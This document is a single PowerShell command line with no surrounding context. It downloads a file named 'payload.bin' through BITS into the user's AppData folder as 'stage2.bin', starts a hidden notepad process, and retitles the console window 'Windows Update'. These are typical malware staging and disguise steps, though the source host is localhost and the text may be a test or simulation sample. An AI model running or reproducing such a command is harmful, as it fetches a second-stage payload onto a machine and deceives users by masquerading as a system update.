
Start-BitsTransfer -Source 'https://localhost:8080/downloads/payload.bin' -Destination "$env:APPDATA\stage2.bin"; Start-Process -FilePath 'notepad.exe' -WindowStyle Hidden; $Host.UI.RawUI.WindowTitle = "Windows Update"
